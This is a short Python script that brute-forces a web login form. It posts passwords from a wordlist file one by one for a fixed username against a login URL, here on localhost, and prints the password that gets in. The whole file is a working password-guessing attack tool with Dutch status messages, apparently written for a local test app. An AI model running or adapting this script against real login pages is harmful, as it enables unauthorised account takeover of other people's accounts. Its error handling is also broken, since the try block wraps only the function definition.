import requests

URL = "http://localhost:8000/accounts/login/"
USERNAME = "arash"
ERROR = "Onjuist wachtwoord!"

try:

    def bruteCracking(username, url, error):
        for password in passwords:
            password = password.strip()
            print("Trying:" + password)
            data_dict = {"username": username, "password": password, "login": "submit"}
            response = requests.post(url, data=data_dict)
            if "wachtwoord" in str(response.content) or "password" in str(
                response.content
            ):
                print(error)
            else:
                print("Wachtwoord gevonden!")
                print("Username: ---> " + username)
                print("Password: ---> " + password)
                exit()

except:
    print("Some Error Occurred Please Check Your Internet Connection!")

with open("cain-and-abel.txt", "r") as passwords:
    bruteCracking(USERNAME, URL, ERROR)
print("Password not found in password list!")
